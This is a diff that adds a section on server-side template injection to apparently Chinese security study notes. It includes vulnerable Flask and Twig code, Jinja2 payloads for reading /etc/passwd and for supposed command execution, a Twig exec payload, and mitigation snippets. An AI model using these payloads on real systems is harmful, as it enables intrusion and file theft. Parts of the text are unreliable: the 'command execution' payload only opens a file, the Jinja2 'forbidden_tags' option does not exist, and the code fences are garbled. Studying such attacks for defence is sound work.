@@ -88,7 +88,100 @@ root
 
 ### 2. SSTI
 
-> 服务端模板引擎注入。
+> SSTI (Server-Side Template Injection) 是一种服务器端模板注入漏洞。
+
+```shell
+用户输入被直接注入到模板引擎中
+模板被动态渲染
+没有适当的输入验证
+```
+
+````shell
+
+### 2. 常见的模板引擎
+
+```python
+# Jinja2 (Python)
+from flask import Flask, render_template_string
+app = Flask(__name__)
+
+@app.route('/page')
+def page():
+    name = request.args.get('name')
+    template = f'Hello {name}!'  # 危险！
+    return render_template_string(template)
+```
+
+```php
+// Twig (PHP)
+$loader = new \Twig\Loader\ArrayLoader();
+$twig = new \Twig\Environment($loader);
+echo $twig->render('Hello {{name}}!', ['name' => $_GET['name']]);  // 危险！
+```
+
+
+#### Jinja2 (Python)
+```python
+# 基本探测
+{{ 7*7 }}
+{{ config }}
+{{ self }}
+
+# 文件读取
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+
+# 命令执行
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('id').read() }}
+```
+
+#### Twig (PHP)
+```php
+{{_self.env.registerUndefinedFilterCallback("exec")}}
+{{_self.env.getFilter("id")}}
+```
+````
+
+>  ==防护措施==
+
+````shell
+
+#### 1. 输入验证
+```python
+def is_safe_input(user_input):
+    return all(c.isalnum() or c.isspace() for c in user_input)
+
+@app.route('/safe')
+def safe_page():
+    name = request.args.get('name')
+    if not is_safe_input(name):
+        return "Invalid input"
+    return render_template('page.html', name=name)
+```
+
+
+#### 2. 使用安全的模板方法
+```python
+# Flask/Jinja2
+from markupsafe import escape
+
+@app.route('/safe')
+def safe_page():
+    name = escape(request.args.get('name'))
+    return render_template('page.html', name=name)
+```
+
+
+#### 3. 禁用危险函数
+```python
+# Jinja2
+from jinja2 import Environment
+env = Environment(
+    autoescape=True,
+    forbidden_tags=['include', 'extends', 'import']
+)
+```
+
+````
 
 
 
